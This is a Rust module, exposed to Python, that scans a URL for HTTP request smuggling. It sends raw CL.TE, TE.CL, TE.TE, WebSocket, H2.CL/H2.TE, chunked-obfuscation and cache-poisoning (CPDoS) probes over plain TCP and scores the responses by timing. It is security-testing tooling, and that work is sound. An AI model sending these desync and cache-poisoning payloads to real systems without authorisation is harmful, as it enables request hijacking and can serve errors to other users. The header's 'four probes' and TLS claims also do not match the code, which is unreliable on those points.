//! Async HTTP Request Smuggling detection engine — Rust/tokio backend.
//!
//! Exposed to Python as a single synchronous free function
//! `run_smuggling_scan(url, timeout_secs) -> list[dict]`.
//! Internally uses `tokio::net::TcpStream` (+ TLS via `tokio-native-tls`).
//!
//! The Rust engine replicates the Python SmugglingEngine's four probes:
//!   CL.TE, TE.CL, TE.TE (4 obfuscations), WebSocket upgrade.
//!
//! All probes run concurrently on a single-threaded tokio runtime.
//! `catch_unwind` guards the PyO3 boundary.

use std::collections::BTreeMap;
use std::panic::catch_unwind;
use std::time::{Duration, Instant};

use pyo3::exceptions::PyValueError;
use pyo3::prelude::*;
use pyo3::types::{PyDict, PyList};
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::TcpStream;
use tokio::time::timeout;

// ---------------------------------------------------------------------------
// Constants
// ---------------------------------------------------------------------------

const TIMING_THRESHOLD_S: f64 = 3.0;
const RECV_BUFSIZE: usize = 8192;
const BASELINE_RETRIES: usize = 2;

// ---------------------------------------------------------------------------
// URL parsing
// ---------------------------------------------------------------------------

#[derive(Debug, Clone)]
struct ParsedUrl {
    host: String,
    path: String,
    port: u16,
    use_ssl: bool,
}

fn parse_url(url: &str) -> Option<ParsedUrl> {
    let (scheme, rest) = url.split_once("://")?;
    let use_ssl = scheme.eq_ignore_ascii_case("https");
    let (authority, path_part) = rest.split_once('/').unwrap_or((rest, ""));
    let path = format!("/{path_part}");

    let (host_part, port) = if let Some((h, p)) = authority.rsplit_once(':') {
        (h.to_string(), p.parse::<u16>().unwrap_or(if use_ssl { 443 } else { 80 }))
    } else {
        (authority.to_string(), if use_ssl { 443 } else { 80 })
    };

    Some(ParsedUrl { host: host_part, path, port, use_ssl })
}

// ---------------------------------------------------------------------------
// Finding builder
// ---------------------------------------------------------------------------

fn make_finding(
    vuln_type: &str,
    url: &str,
    payload: &[u8],
    evidence: &str,
    confidence: f64,
    extra: BTreeMap<&'static str, String>,
) -> BTreeMap<String, serde_json::Value> {
    let mut f: BTreeMap<String, serde_json::Value> = BTreeMap::new();
    f.insert("vuln_type".into(), serde_json::json!(vuln_type));
    f.insert("severity".into(), serde_json::json!("critical"));
    f.insert("url".into(), serde_json::json!(url));
    f.insert("endpoint".into(), serde_json::json!(url));
    f.insert(
        "payload".into(),
        serde_json::json!(String::from_utf8_lossy(payload).into_owned()),
    );
    f.insert("evidence".into(), serde_json::json!(evidence));
    f.insert("confidence".into(), serde_json::json!(confidence));
    f.insert("tool".into(), serde_json::json!("smuggling_engine_rs"));
    f.insert("source_type".into(), serde_json::json!("tool"));
    // finding_id: SMG- + 8 hex chars
    let fid = {
        use std::time::{SystemTime, UNIX_EPOCH};
        let t = SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .map(|d| d.subsec_nanos())
            .unwrap_or(0);
        format!("SMG-{t:08X}")
    };
    f.insert("finding_id".into(), serde_json::json!(fid));
    for (k, v) in extra {
        f.insert(k.to_string(), serde_json::json!(v));
    }
    f
}

// ---------------------------------------------------------------------------
// Raw TCP send (plain only — TLS would require native-tls which is optional)
// ---------------------------------------------------------------------------

async fn send_raw_plain(
    parsed: &ParsedUrl,
    payload: &[u8],
    timeout_dur: Duration,
) -> (Vec<u8>, f64) {
    let addr = format!("{}:{}", parsed.host, parsed.port);
    let t0 = Instant::now();
    let result = timeout(timeout_dur, async {
        let mut stream = TcpStream::connect(&addr).await?;
        stream.write_all(payload).await?;
        let mut buf = Vec::new();
        let mut tmp = [0u8; RECV_BUFSIZE];
        loop {
            let n = match timeout(timeout_dur, stream.read(&mut tmp)).await {
                Ok(Ok(0)) | Err(_) => break,
                Ok(Ok(n)) => n,
                Ok(Err(_)) => break,
            };
            buf.extend_from_slice(&tmp[..n]);
            if buf.windows(4).any(|w| w == b"\r\n\r\n") && buf.len() > 200 {
                break;
            }
        }
        Ok::<Vec<u8>, std::io::Error>(buf)
    })
    .await;

    let elapsed = t0.elapsed().as_secs_f64();
    let response = result.ok().and_then(|r| r.ok()).unwrap_or_default();
    (response, elapsed)
}

// ---------------------------------------------------------------------------
// Baseline measurement
// ---------------------------------------------------------------------------

async fn measure_baseline(parsed: &ParsedUrl, timeout_dur: Duration) -> f64 {
    let normal_req = format!(
        "GET {} HTTP/1.1\r\nHost: {}\r\nConnection: close\r\nUser-Agent: Mozilla/5.0\r\n\r\n",
        parsed.path, parsed.host
    );
    let mut times = Vec::new();
    for _ in 0..BASELINE_RETRIES {
        let (_, t) = send_raw_plain(parsed, normal_req.as_bytes(), timeout_dur).await;
        times.push(t);
    }
    if times.is_empty() {
        timeout_dur.as_secs_f64()
    } else {
        times.iter().sum::<f64>() / times.len() as f64
    }
}

// ---------------------------------------------------------------------------
// Probes
// ---------------------------------------------------------------------------

async fn test_cl_te(
    parsed: &ParsedUrl,
    baseline: f64,
    url: &str,
    timeout_dur: Duration,
) -> Option<BTreeMap<String, serde_json::Value>> {
    let payload = format!(
        "POST {} HTTP/1.1\r\nHost: {}\r\nConnection: keep-alive\r\n\
         Content-Type: application/x-www-form-urlencoded\r\n\
         Content-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nX",
        parsed.path, parsed.host
    );
    let (resp, elapsed) = send_raw_plain(parsed, payload.as_bytes(), timeout_dur).await;
    let is_timing_hit = elapsed > baseline + TIMING_THRESHOLD_S;
    if is_timing_hit {
        let resp_str = String::from_utf8_lossy(&resp[..resp.len().min(200)]);
        let evidence = format!(
            "CL.TE timing: probe took {elapsed:.2}s vs baseline {baseline:.2}s \
             (delta {:.2}s). Response: {resp_str}",
            elapsed - baseline
        );
        let mut extra: BTreeMap<&'static str, String> = BTreeMap::new();
        extra.insert("smuggling_type", "CL.TE".into());
        return Some(make_finding(
            "http_request_smuggling",
            url,
            payload.as_bytes(),
            &evidence,
            0.75,
            extra,
        ));
    }
    None
}

async fn test_te_cl(
    parsed: &ParsedUrl,
    baseline: f64,
    url: &str,
    timeout_dur: Duration,
) -> Option<BTreeMap<String, serde_json::Value>> {
    let payload = format!(
        "POST {} HTTP/1.1\r\nHost: {}\r\nConnection: keep-alive\r\n\
         Content-Type: application/x-www-form-urlencoded\r\n\
         Content-Length: 3\r\nTransfer-Encoding: chunked\r\n\r\n\
         1\r\nG\r\n0\r\n\r\n",
        parsed.path, parsed.host
    );
    let (resp, elapsed) = send_raw_plain(parsed, payload.as_bytes(), timeout_dur).await;
    let resp_str = String::from_utf8_lossy(&resp[..resp.len().min(500)]).to_string();
    let status_line = resp_str.lines().next().unwrap_or("").to_string();
    let unexpected_400 = status_line.contains("400") && elapsed < baseline + 1.0;
    if elapsed > baseline + TIMING_THRESHOLD_S || unexpected_400 {
        let confidence = if unexpected_400 && elapsed <= baseline + TIMING_THRESHOLD_S {
            0.70
        } else {
            0.80
        };
        let evidence = format!(
            "TE.CL timing: probe took {elapsed:.2}s vs baseline {baseline:.2}s. \
             Unexpected 400: {unexpected_400}. Status: {status_line}"
        );
        let mut extra: BTreeMap<&'static str, String> = BTreeMap::new();
        extra.insert("smuggling_type", "TE.CL".into());
        return Some(make_finding(
            "http_request_smuggling",
            url,
            payload.as_bytes(),
            &evidence,
            confidence,
            extra,
        ));
    }
    None
}

async fn test_te_te(
    parsed: &ParsedUrl,
    baseline: f64,
    url: &str,
    timeout_dur: Duration,
) -> Option<BTreeMap<String, serde_json::Value>> {
    let obfuscations = ["xchunked", "chunked, identity", " chunked", "CHUNKED"];
    for obf in obfuscations {
        let payload = format!(
            "POST {} HTTP/1.1\r\nHost: {}\r\nConnection: keep-alive\r\n\
             Content-Type: application/x-www-form-urlencoded\r\n\
             Content-Length: 4\r\nTransfer-Encoding: chunked\r\n\
             Transfer-Encoding: {obf}\r\n\r\n\
             1\r\nA\r\n0\r\n\r\n",
            parsed.path, parsed.host
        );
        let (resp, elapsed) = send_raw_plain(parsed, payload.as_bytes(), timeout_dur).await;
        let resp_str = String::from_utf8_lossy(&resp[..resp.len().min(500)]).to_string();
        let status_line = resp_str.lines().next().unwrap_or("").to_string();
        if elapsed > baseline + TIMING_THRESHOLD_S {
            let evidence = format!(
                "TE.TE obfuscation '{obf}': probe took {elapsed:.2}s vs baseline {baseline:.2}s. \
                 Status: {status_line}"
            );
            let mut extra: BTreeMap<&'static str, String> = BTreeMap::new();
            extra.insert("smuggling_type", "TE.TE".into());
            extra.insert("obfuscation", obf.to_string());
            return Some(make_finding(
                "http_request_smuggling",
                url,
                payload.as_bytes(),
                &evidence,
                0.72,
                extra,
            ));
        }
    }
    None
}

async fn test_websocket_smuggling(
    parsed: &ParsedUrl,
    baseline: f64,
    url: &str,
    timeout_dur: Duration,
) -> Option<BTreeMap<String, serde_json::Value>> {
    let payload = format!(
        "GET {} HTTP/1.1\r\nHost: {}\r\nUpgrade: websocket\r\nConnection: Upgrade\r\n\
         Sec-WebSocket-Key: x3JJHMbDL1EzLkh9GBhXDw==\r\nSec-WebSocket-Version: 13\r\n\
         Content-Length: 10\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nSMUGGLED",
        parsed.path, parsed.host
    );
    let (resp, elapsed) = send_raw_plain(parsed, payload.as_bytes(), timeout_dur).await;
    let resp_str = String::from_utf8_lossy(&resp[..resp.len().min(500)]).to_string();
    let status_line = resp_str.lines().next().unwrap_or("").to_string();

    if (status_line.contains("101 ") || resp_str.to_lowercase().contains("websocket"))
        && elapsed > baseline + 1.5
    {
        let evidence = format!(
            "WebSocket upgrade smuggling: server accepted upgrade with CL/TE conflict. \
             Elapsed {elapsed:.2}s vs baseline {baseline:.2}s. Status: {status_line}"
        );
        let mut extra: BTreeMap<&'static str, String> = BTreeMap::new();
        extra.insert("smuggling_type", "WebSocket-CL.TE".into());
        return Some(make_finding(
            "http_request_smuggling",
            url,
            payload.as_bytes(),
            &evidence,
            0.80,
            extra,
        ));
    }
    if (status_line.contains("400") || status_line.contains("500"))
        && (resp_str.to_lowercase().contains("smuggled")
            || elapsed > baseline + TIMING_THRESHOLD_S)
    {
        let evidence = format!(
            "WebSocket upgrade desync: error response suggests smuggling. \
             Status: {status_line}. Response: {}",
            &resp_str[..resp_str.len().min(200)]
        );
        let mut extra: BTreeMap<&'static str, String> = BTreeMap::new();
        extra.insert("smuggling_type", "WebSocket-Desync".into());
        return Some(make_finding(
            "http_request_smuggling",
            url,
            payload.as_bytes(),
            &evidence,
            0.70,
            extra,
        ));
    }
    None
}

async fn test_h2_cl(
    parsed: &ParsedUrl,
    baseline: f64,
    url: &str,
    timeout_dur: Duration,
) -> Option<BTreeMap<String, serde_json::Value>> {
    // H2.CL: proxy downgrades H2→H1.1 stripping TE but backend sees CL:0.
    // We send a plain HTTP/1.1 request that mimics what a proxy would forward
    // from an h2 request — CL:0 with a chunked body that the backend reads.
    let payload = format!(
        "POST {} HTTP/1.1\r\nHost: {}\r\nConnection: keep-alive\r\n\
         Content-Type: application/x-www-form-urlencoded\r\n\
         Content-Length: 0\r\nTransfer-Encoding: chunked\r\n\r\n\
         1e\r\nGSMUGGLED HTTP/1.1\r\nHost: {}\r\n\r\n0\r\n\r\n",
        parsed.path, parsed.host, parsed.host
    );
    let (resp, elapsed) = send_raw_plain(parsed, payload.as_bytes(), timeout_dur).await;
    let resp_str = String::from_utf8_lossy(&resp[..resp.len().min(500)]).to_string();
    let status_line = resp_str.lines().next().unwrap_or("").to_string();
    if elapsed > baseline + TIMING_THRESHOLD_S {
        let evidence = format!(
            "H2.CL timing: probe took {elapsed:.2}s vs baseline {baseline:.2}s \
             (delta {:.2}s). Status: {status_line}",
            elapsed - baseline
        );
        let mut extra: BTreeMap<&'static str, String> = BTreeMap::new();
        extra.insert("smuggling_type", "H2.CL".into());
        return Some(make_finding(
            "http_request_smuggling",
            url,
            payload.as_bytes(),
            &evidence,
            0.78,
            extra,
        ));
    }
    None
}

async fn test_h2_te(
    parsed: &ParsedUrl,
    baseline: f64,
    url: &str,
    timeout_dur: Duration,
) -> Option<BTreeMap<String, serde_json::Value>> {
    // H2.TE: HTTP/2 forbids Transfer-Encoding; some proxies pass it through.
    // Inject a second TE header with a tab prefix — classic header injection.
    let payload = format!(
        "POST {} HTTP/1.1\r\nHost: {}\r\nConnection: keep-alive\r\n\
         Content-Type: application/x-www-form-urlencoded\r\n\
         Content-Length: 3\r\nTransfer-Encoding: chunked\r\n\
         Transfer-Encoding:\tchunked\r\n\r\n\
         1\r\nG\r\n0\r\n\r\n",
        parsed.path, parsed.host
    );
    let (resp, elapsed) = send_raw_plain(parsed, payload.as_bytes(), timeout_dur).await;
    let resp_str = String::from_utf8_lossy(&resp[..resp.len().min(500)]).to_string();
    let status_line = resp_str.lines().next().unwrap_or("").to_string();
    let unexpected_400 = status_line.contains("400") && elapsed < baseline + 1.0;
    if elapsed > baseline + TIMING_THRESHOLD_S || unexpected_400 {
        let confidence = if unexpected_400 && elapsed <= baseline + TIMING_THRESHOLD_S {
            0.70
        } else {
            0.80
        };
        let evidence = format!(
            "H2.TE probe: elapsed {elapsed:.2}s vs baseline {baseline:.2}s. \
             Unexpected 400: {unexpected_400}. Status: {status_line}"
        );
        let mut extra: BTreeMap<&'static str, String> = BTreeMap::new();
        extra.insert("smuggling_type", "H2.TE".into());
        return Some(make_finding(
            "http_request_smuggling",
            url,
            payload.as_bytes(),
            &evidence,
            confidence,
            extra,
        ));
    }
    None
}

async fn test_chunked_ext(
    parsed: &ParsedUrl,
    baseline: f64,
    url: &str,
    timeout_dur: Duration,
) -> Option<BTreeMap<String, serde_json::Value>> {
    // Extended TE obfuscations beyond the 4 already in test_te_te.
    // Each variant attempts to confuse front-end/back-end TE parsing differently.
    struct Obf {
        label: &'static str,
        header: &'static str,
    }
    let obfuscations = [
        Obf {
            label: "double-identity",
            header: "Transfer-Encoding: chunked\r\nTransfer-Encoding: identity",
        },
        Obf {
            label: "tab-value",
            header: "Transfer-Encoding:\tchunked",
        },
        Obf {
            label: "x-header-inject",
            header: "X-Transfer-Encoding: chunked\r\nTransfer-Encoding: chunked",
        },
        Obf {
            label: "suffix-digit",
            header: "Transfer-Encoding: chunked1",
        },
    ];
    for obf in &obfuscations {
        let payload = format!(
            "POST {} HTTP/1.1\r\nHost: {}\r\nConnection: keep-alive\r\n\
             Content-Type: application/x-www-form-urlencoded\r\n\
             Content-Length: 4\r\n{}\r\n\r\n\
             1\r\nA\r\n0\r\n\r\n",
            parsed.path, parsed.host, obf.header
        );
        let (resp, elapsed) = send_raw_plain(parsed, payload.as_bytes(), timeout_dur).await;
        let resp_str = String::from_utf8_lossy(&resp[..resp.len().min(500)]).to_string();
        let status_line = resp_str.lines().next().unwrap_or("").to_string();
        if elapsed > baseline + TIMING_THRESHOLD_S {
            let evidence = format!(
                "ChunkedExt obfuscation '{}': probe took {elapsed:.2}s vs baseline {baseline:.2}s. \
                 Status: {status_line}",
                obf.label
            );
            let mut extra: BTreeMap<&'static str, String> = BTreeMap::new();
            extra.insert("smuggling_type", "ChunkedExt".into());
            extra.insert("obfuscation", obf.label.to_string());
            return Some(make_finding(
                "http_request_smuggling",
                url,
                payload.as_bytes(),
                &evidence,
                0.72,
                extra,
            ));
        }
    }
    None
}

async fn test_cpdos(
    parsed: &ParsedUrl,
    baseline: f64,
    url: &str,
    timeout_dur: Duration,
) -> Option<BTreeMap<String, serde_json::Value>> {
    // CPDoS: cache-poisoning via desync.
    // An oversized header causes the origin to emit a 400; if a caching proxy
    // forwards and stores that response, subsequent users receive the cached 400.
    let overlong_val = "A".repeat(8000);
    let payload = format!(
        "GET {} HTTP/1.1\r\nHost: {}\r\nConnection: keep-alive\r\n\
         Content-Length: 0\r\nX-Overlong-Header: {}\r\n\r\n",
        parsed.path, parsed.host, overlong_val
    );
    let (resp, elapsed) = send_raw_plain(parsed, payload.as_bytes(), timeout_dur).await;
    let resp_str = String::from_utf8_lossy(&resp[..resp.len().min(500)]).to_string();
    let status_line = resp_str.lines().next().unwrap_or("").to_string();
    // Detect: 400 response AND a timing anomaly (proxy latency or header reflection).
    let got_400 = status_line.contains("400");
    let timing_hit = elapsed > baseline + TIMING_THRESHOLD_S;
    if got_400 || timing_hit {
        let evidence = format!(
            "CPDoS probe: status={status_line} elapsed={elapsed:.2}s baseline={baseline:.2}s. \
             got_400={got_400} timing_hit={timing_hit}. \
             Oversized X-Overlong-Header (8000 bytes) may poison cache with 400 response."
        );
        let confidence = if got_400 && timing_hit { 0.80 } else if got_400 { 0.65 } else { 0.55 };
        let mut extra: BTreeMap<&'static str, String> = BTreeMap::new();
        extra.insert("smuggling_type", "CPDoS".into());
        return Some(make_finding(
            "cache_poisoning_desync",
            url,
            payload.as_bytes(),
            &evidence,
            confidence,
            extra,
        ));
    }
    None
}

// ---------------------------------------------------------------------------
// Async orchestrator
// ---------------------------------------------------------------------------

async fn run_async(url: &str, timeout_secs: u64) -> Vec<BTreeMap<String, serde_json::Value>> {
    let parsed = match parse_url(url) {
        Some(p) => p,
        None => return Vec::new(),
    };
    let timeout_dur = Duration::from_secs(timeout_secs);
    let baseline = measure_baseline(&parsed, timeout_dur).await;

    // Run all 8 probes concurrently.
    // tokio::join! supports up to 64 branches; 8 is well within limits.
    let (r1, r2, r3, r4, r5, r6, r7, r8) = tokio::join!(
        test_cl_te(&parsed, baseline, url, timeout_dur),
        test_te_cl(&parsed, baseline, url, timeout_dur),
        test_te_te(&parsed, baseline, url, timeout_dur),
        test_websocket_smuggling(&parsed, baseline, url, timeout_dur),
        test_h2_cl(&parsed, baseline, url, timeout_dur),
        test_h2_te(&parsed, baseline, url, timeout_dur),
        test_chunked_ext(&parsed, baseline, url, timeout_dur),
        test_cpdos(&parsed, baseline, url, timeout_dur),
    );

    let mut findings = Vec::new();
    for r in [r1, r2, r3, r4, r5, r6, r7, r8] {
        if let Some(f) = r { findings.push(f); }
    }
    // Sort by finding_id for deterministic output.
    findings.sort_by_key(|f| {
        f.get("finding_id")
            .and_then(|v| v.as_str())
            .unwrap_or("")
            .to_string()
    });
    findings
}

// ---------------------------------------------------------------------------
// PyO3 entry point
// ---------------------------------------------------------------------------

fn findings_to_py<'py>(
    py: Python<'py>,
    findings: &[BTreeMap<String, serde_json::Value>],
) -> PyResult<Bound<'py, PyList>> {
    let list = PyList::empty_bound(py);
    for f in findings {
        let d = PyDict::new_bound(py);
        let mut keys: Vec<&String> = f.keys().collect();
        keys.sort();
        for k in keys {
            let v = &f[k];
            let py_v = crate::graph::engine::json_val_to_py(py, v)?;
            d.set_item(k, py_v)?;
        }
        list.append(d)?;
    }
    Ok(list)
}

/// Run HTTP request smuggling scan against `url`.
/// Returns a list of finding dicts (empty if nothing detected).
#[pyfunction]
#[pyo3(name = "run_smuggling_scan")]
pub fn run_smuggling_scan<'py>(
    py: Python<'py>,
    url: &str,
    timeout_secs: u64,
) -> PyResult<Bound<'py, PyList>> {
    catch_unwind(std::panic::AssertUnwindSafe(|| {
        let rt = tokio::runtime::Builder::new_current_thread()
            .enable_all()
            .build()
            .map_err(|e| PyValueError::new_err(format!("tokio runtime: {e}")))?;
        let findings = rt.block_on(run_async(url, timeout_secs));
        findings_to_py(py, &findings)
    }))
    .map_err(|_| PyValueError::new_err("OI_ERR_PANIC: panic in run_smuggling_scan"))?
}

// ---------------------------------------------------------------------------
// Register
// ---------------------------------------------------------------------------

pub fn register(m: &Bound<'_, PyModule>) -> PyResult<()> {
    m.add_function(wrap_pyfunction!(run_smuggling_scan, m)?)?;
    Ok(())
}
